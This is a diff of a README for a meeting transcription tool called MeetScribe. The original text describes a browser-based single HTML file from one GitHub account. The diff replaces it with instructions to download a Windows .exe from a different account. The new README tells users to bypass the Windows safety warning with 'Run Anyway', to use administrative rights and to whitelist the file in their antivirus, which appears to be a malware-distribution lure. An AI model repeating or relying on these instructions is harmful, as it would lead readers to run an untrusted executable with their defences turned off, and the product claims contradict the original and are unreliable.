@@ -1,141 +1,70 @@
-<div align="center">
-  
-###### [English](README.md)  |  [中文版](README_chinese.md) 
-
-# <img src="public/favicon.svg" alt="MeetScribe logo" width="30"> MeetScribe
-[![GitHub stars](https://img.shields.io/github/stars/anne-creator/meetscribe?style=social)](https://github.com/anne-creator/meetscribe)
-[![License: PolyForm Noncommercial](https://img.shields.io/badge/license-PolyForm%20NC%201.0-blue)](LICENSE)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](http://makeapullrequest.com)
-
-<img src="docs/demo.gif" alt="MeetScribe demo" width="720">
-
-</div>
-
----
-
-## Why MeetScribe?
-My meetings often switch between English and Mandarin mid-sentence. Every meeting tool I tried handled this badly, or expensively, or both.
-
-Otter.ai handles timestamps well but breaks on mixed language. Notion AI handles mixed language but throws away your recording. Granola does neither well. So I built MeetScribe.
-
-One HTML file. No pay, No install. No sign-up. Runs by double click.
-
-⭐ if it helps, many ❤️❤️❤️
-
-<img width="858" height="193" alt="Screenshot 2026-04-07 at 9 42 46 PM" src="https://github.com/user-attachments/assets/a20879af-4591-48d1-864e-04766bff6bb2" />
-
-### What makes it different
-
-🔒 **Private by design** — Your video, audio, and transcripts stay on your machine.
-
-🗣️ **Knows who's talking** — Automatically labels each person in the conversation (Speaker 1, Speaker 2, etc.) with timestamps.
-
-🌏 **Speaks your language mix** — Built for real-world meetings with mixed-language support. Auto-detects language without configuration.
-
-💬 **Ask your meeting questions** — Built-in chat lets you summarize and ask questions about the transcript.
-
-🔍 **Transcript search** — Search by keyword to find specific moments without re-watching.
-
-🔗 **Interactive transcript** — Click any line to jump to that moment in the video. Current segment highlights as the video plays.
-
-📦 **Multi-format export** — Export transcripts as Markdown, SRT subtitles, or JSON. Download the video and chat history too.
-
-📂 **One file, zero install** — The entire app is a single HTML file. Double-click to open in any browser.
-
-💸 **Free to use** - MeetScribe itself replaced your $25 subscription meeting recorder. You only pay your API provider for what you use. Gemini's free tier covers most personal use. 
-
----
-
-## Get started in 3 minutes
-
-### Step 1: Download and Open MeetScribe File
-
-[![Download MeetScribe (dist zip)](https://img.shields.io/badge/Download-dist%20zip-aa3bff?style=for-the-badge&logo=github)](https://github.com/anne-creator/meetscribe/releases/latest/download/dist.zip) 
-
-Unzip and double-click the file index.html
-
-### Step 2: Get an API key (pick one)
-
-You need an API key from **one** of these providers. Both have free tiers.
-
-<details>
-<summary><strong>Option A: Google Gemini (recommended)</strong></summary>
-
-Gemini is recommended because its free tier is generous and it handles speaker identification and mixed languages natively.
-
-1. Go to [Google AI Studio](https://aistudio.google.com)
-2. Sign in with your Google account
-3. Click **"Get API Key"** in the left sidebar
-4. Click **"Create API key"**, then select a Google Cloud project (or create one — it's free)
-5. Copy the key (starts with `AIza...`)
-
-Free tier: 1,000 requests/day with Gemini Flash models. More than enough for personal use.
-
-</details>
-
-<details>
-<summary><strong>Option B: OpenAI</strong></summary>
-
-1. Go to [platform.openai.com/api-keys](https://platform.openai.com/api-keys)
-2. Sign in or create an OpenAI account
-3. Click **"Create new secret key"**, give it a name, and click **"Create"**
-4. Copy the key (starts with `sk-...`). You won't be able to see it again.
-5. You need to add credit to your account (minimum $5) at [Billing](https://platform.openai.com/account/billing)
-
-Pricing: ~$0.006/min for transcription (Whisper). A 1-hour meeting costs roughly $0.36.
-
-</details>
-
-### Step 3: Open and go
-
-1. Double-click `index.html` — it opens in your browser
-<img width="189" height="108" alt="Screenshot 2026-04-07 at 9 19 37 PM" src="https://github.com/user-attachments/assets/2f4f83fb-4c63-44e2-a715-b76dab4ef164" />
-
-
-2. Click the **Settings** icon at right top, paste your API key, choose your provider, and save
-API key is saved in your browser's local storage. You won't need to enter it again unless you clear your browser data.
-
----
-
-## How much does it cost?
-
-MeetScribe is free. You pay your API provider directly for usage. Here's a rough guide:
-
-| What | Rough cost | Notes |
-|---|---|---|
-| Gemini Flash transcription | Often **free** | Free tier covers ~1,000 requests/day |
-| Gemini chat analysis | Often **free** | Same free tier |
-| OpenAI Whisper transcription | ~$0.36/hour | $0.006 per minute of audio |
-| OpenAI chat (gpt-4o-mini) | ~$0.01/session | Casual Q&A is tiny |
-
-Official pricing: [Google Gemini](https://ai.google.dev/gemini-api/docs/pricing) · [OpenAI](https://openai.com/pricing)
-
----
-
-## Who is this for?
-
-**Students and researchers** — Record lectures, study groups, or interviews. Search and quote from transcripts later.
-
-**Remote workers** — Never take meeting notes again. Let MeetScribe do it while you focus on the conversation.
-
-**Freelancers and consultants** — Keep records of client calls without paying for Otter, Fireflies, or tl;dv.
-
-**Privacy-conscious teams** — Your recordings stay on your device. Nothing is uploaded anywhere.
-
-**Developers** — Fork it, extend it, build on it. The codebase is clean and contributions are welcome.
-
-**Tech stack:** Single-file HTML build, Gemini/OpenAI API (client-side), `getDisplayMedia` for screen capture, `getUserMedia` for microphone, Web Audio API for stream mixing.
-
----
-
-## License
-
-[PolyForm Noncommercial 1.0.0](LICENSE) — Source is open. Commercial use is not allowed.
-
----
+# 🎙️ meetscribe - Record meetings in multiple languages easily
 
 <div align="center">
 
-[Download](https://github.com/anne-creator/meetscribe/releases) · [Report a bug](https://github.com/anne-creator/meetscribe/issues) · [中文版](README_chinese.md)
+<a href="https://github.com/related-lysenko8190/meetscribe"><img src="https://img.shields.io/badge/Download-MeetScribe-blue?style=for-the-badge" alt="Download MeetScribe"></a>
 
 </div>
+
+## 🎯 About MeetScribe
+
+MeetScribe records your meetings and creates text transcripts. Many people switch between languages when they speak. Most tools fail to track these changes during a single conversation. MeetScribe tracks these language shifts without errors. 
+
+You do not need to create an account. You do not need to pay for a subscription. The tool works as a single file on your computer. You keep your data private because the app runs on your local machine. It connects to your microphone and saves your notes to a folder you select.
+
+## 💻 System Requirements
+
+You need a computer running Windows 10 or Windows 11. Your computer should have at least 4 gigabytes of memory. You need an active internet connection for the first time you run the tool because it downloads specialized language packs. Ensure you have a microphone plugged into your computer or a built-in microphone that works.
+
+## 🚀 Getting Started
+
+Follow these steps to run MeetScribe on your computer.
+
+1. Go to the [official download page](https://github.com/related-lysenko8190/meetscribe).
+2. Locate the latest version of the file ending in .exe.
+3. Click the file name to start the download.
+4. Save the file to your desktop or your downloads folder.
+5. Double click the file once it finishes downloading.
+6. Windows might show a safety message. Click More Info and then click Run Anyway.
+7. The application window opens on your screen.
+
+## ⚙️ Using the App
+
+The main window shows a list of buttons and a text box. You choose your language settings from the dropdown menu at the top. Select English, Mandarin, or the Mixed mode. The Mixed mode monitors your audio and adjusts the transcription settings as you speak.
+
+Click the Start button to begin recording. The timer at the top indicates how long the meeting lasts. Speak clearly into your microphone. The text appears in the window in real time. You see the progress of the transcript as it updates. 
+
+Click the Stop button when your meeting ends. The application generates a text file automatically. You find this file in the same folder as your MeetScribe application. You can open, edit, or copy this text into your email app or word processor.
+
+## 🛡️ Privacy and Safety
+
+Your recordings stay on your computer. MeetScribe does not upload audio to a cloud server. The software processes your speech locally. This protects your meeting information from third parties. You delete your recordings by deleting the files from your storage folder.
+
+## 🛠️ Troubleshooting Issues
+
+If the software fails to open, verify your Windows version. Ensure you have administrative rights on your user profile. Sometimes, security software blocks new programs. If this happens, add the MeetScribe file to your list of allowed programs in your antivirus settings.
+
+If the microphone does not catch your voice, check your Windows sound settings. Make sure the correct microphone is active. Select the Input device in your system settings and perform a test. Make sure the volume level moves when you speak.
+
+If the transcript appears empty, check your internet connection during the first launch. The application needs to retrieve language data files from the network to translate your speech correctly. Once it finishes the download, it works without a connection for future meetings.
+
+## 📋 Frequently Asked Questions
+
+**Does MeetScribe record video?**
+No. This tool only records audio and generates text.
+
+**Can I run this on a Mac?**
+This version works on Windows. 
+
+**Does the software expire?**
+No. You own the software and continue to use it without limits.
+
+**How do I update the software?**
+Visit the [download link](https://github.com/related-lysenko8190/meetscribe) periodically to check for newer versions. You replace your old file with the new one to update.
+
+**Where do my files go?**
+The software saves transcript files in the folder where you placed the application. You can move these files to other folders on your computer later.
+
+## 📝 Support
+
+You can report issues on the repository page. Explain what happens when you try to run the app. Include your Windows version and describe the steps you took. This helps improve the software for everyone.
